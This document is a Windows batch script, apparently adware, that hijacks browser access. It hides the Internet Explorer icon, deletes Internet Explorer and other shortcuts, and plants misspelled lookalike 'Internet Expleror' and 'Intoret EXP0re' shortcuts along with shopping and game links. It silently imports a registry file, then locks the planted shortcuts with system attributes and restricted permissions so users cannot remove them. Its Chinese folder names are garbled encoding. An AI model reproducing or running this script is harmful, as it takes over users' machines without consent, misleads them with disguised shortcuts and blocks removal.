cls
@echo off
 Reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu" /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t "REG_DWORD" /d "1" /f
Reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t "REG_DWORD" /d "1" /f
Set "TMPINF=C:\TmpInf.inf"
echo [Version] >%TMPINF%
echo Signature="$Windows NT$" >>%TMPINF%
echo [DefaultInstall] >>%TMPINF%
RUNDLL32 SETUPAPI.DLL,InstallHinfSection DefaultInstall 128 %TMPINF%
del %TMPINF%

 
del "%userprofile%\����\IEXPLORE.lnk"
del "%userprofile%\����\IEXPLOREr.lnk"
del "%userprofile%\����\Internet Exporer.lnk" /f/q/a
del "%userprofile%\����\Internet Explorer.lnk" /f/q/a
del "%userprofile%\����\Internet Exp1orer.lnk"
del "%userprofile%\����\Internet Explorer.lnk" 
del "%userprofile%\����\Internet*.lnk"  /f/q/a
del "%userprofile%\����\*Internet*.lnk" /f/q/a
 
del  "C:\Documents and Settings\All Users\����\Internet Explorer.lnk" /f/q/a
del  "C:\Documents and Settings\All Users\����\Internet*.lnk" /f/q/a
del  "C:\Documents and Settings\All Users\����\*Internet*.lnk" /f/q/a


del "%userprofile%\����ʼ���˵�\����\Internet*.lnk"  /f/q/a
del "%userprofile%\����ʼ���˵�\����\*Internet*.lnk" /f/q/a


del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk" /f/q/a
del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.url" /f/q/a
del "%userprofile%\����\*.url"     /f/q/a
del  "C:\Documents and Settings\All Users\����\*.url" /f/q/a

del   "%userprofile%\����ʼ���˵�\*.url"   /f/q/a
del   "%userprofile%\����ʼ���˵�\*.lnk"  /f/q/a
del  "C:\Documents and Settings\All Users\����ʼ���˵�\*.url" /f/q/a
del  "C:\Documents and Settings\All Users\����ʼ���˵�\*.lnk" /f/q/a

 
 
 
 
copy "�Ա�����.lnk" "%userprofile%\����ʼ���˵�\�Ա�����.lnk" /y
copy "��ѵ�Ӱ.lnk" "%userprofile%\����ʼ���˵�\��ѵ�Ӱ.lnk" /y
 
copy "yx.lnk" "%userprofile%\����ʼ���˵�\С��Ϸ.lnk" /y
 

copy "taobao.lnk" "%userprofile%\Favorites\�Ա�����.lnk" /y
copy "��ѵ�Ӱ.lnk" "%userprofile%\Favorites\��ѵ�Ӱ.lnk" /y
copy "yx.lnk" "%userprofile%\Favorites\С��Ϸ.lnk" /y 
 
copy "Inonet.lnk" "%userprofile%\����\Internet Expleror.lnk" /y
copy "Inonet.lnk" "%userprofile%\����ʼ���˵�\��ַ֮��.lnk" /y
copy "Inonet.lnk" "%userprofile%\����ʼ���˵�\����\��վ��ȫ.lnk" /y 
  
copy "Inonet.lnk" "%userprofile%\����ʼ���˵�\Internet Expleror.lnk" /y
copy "Inonet.lnk" "%userprofile%\����ʼ���˵�\����\Internet Expleror.lnk" /y
copy "Inonet.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Intoret EXP0re.lnk" /y
 
 copy "yx.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\С��Ϸ.lnk" /y
  copy "��ѵ�Ӱ.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\��ѵ�Ӱ.lnk" /y
 
regedit /s ss.reg

 
 
 attrib  "%USERPROFILE%\����\Internet Expleror.lnk"  +R +S

 attrib "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk"  +R +S
attrib  "%userprofile%\����ʼ���˵�\��ַ֮��.lnk" +R +S




 attrib  "%USERPROFILE%\����\�Ա�����.lnk"  +R +S
attrib  "%USERPROFILE%\����\��ѵ�Ӱ.lnk"  +R +S
attrib  "%USERPROFILE%\����\С��Ϸ.lnk"  +R +S
 

 
attrib  "%userprofile%\����ʼ���˵�\�Ա�����.lnk" +R +S
attrib  "%userprofile%\����ʼ���˵�\��ѵ�Ӱ.lnk" +R +S
 
attrib  "%userprofile%\����ʼ���˵�\С��Ϸ.lnk" +R +S
echo y| cacls "%userprofile%\����\Internet Expleror.lnk"   /p everyone:R
echo y| cacls "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Intoret EXP0re.lnk"  /p everyone:R
echo y| cacls "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\С��Ϸ.lnk"  /p everyone:R
echo y| cacls "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\��ѵ�Ӱ.lnk"  /p everyone:R
echo y| cacls "%userprofile%\����\С��Ϸ.lnk"   /p everyone:R
echo y| cacls "%userprofile%\����\�Ա�����.lnk"   /p everyone:R
echo y| cacls "%userprofile%\����ʼ���˵�\Internet Expleror.lnk"   /p everyone:R
echo y| cacls "%userprofile%\����ʼ���˵�\С��Ϸ.lnk"   /p everyone:R
echo y| cacls "%userprofile%\����ʼ���˵�\��ѵ�Ӱ.lnk"   /p everyone:R

exit